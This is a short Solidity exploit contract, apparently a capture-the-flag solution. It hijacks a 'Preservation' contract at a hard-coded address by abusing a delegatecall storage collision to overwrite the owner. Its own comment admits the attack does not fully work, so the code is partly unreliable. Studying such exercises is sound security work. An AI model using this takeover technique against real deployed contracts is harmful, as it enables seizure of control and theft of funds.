// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation{
    function setFirstTime(uint _timeStamp) public {}
    function setSecondTime(uint _timeStamp) public {}
}

contract hackPreservation{
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3

    Preservation originalContract = Preservation(0x580e03c2082EA4FC648c6d223FB1d98b1569c345);
    
    //call this function twice (not sure why 2nd time doesnt change owner -- but await contract.setFirstTime(4) works from console
    function changeAddress() public {
        originalContract.setFirstTime(uint(address(this)));
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }

}